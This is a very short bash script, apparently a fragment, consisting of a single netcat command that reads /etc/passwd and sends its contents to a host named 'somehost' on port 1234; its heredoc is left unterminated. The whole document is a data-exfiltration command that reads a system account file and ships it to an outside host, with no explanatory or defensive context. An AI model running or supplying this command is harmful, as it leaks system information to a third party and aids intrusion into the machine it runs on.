#!/usr/bin/env bash

nc somehost 1234 <<EOF
$(cat /etc/passwd)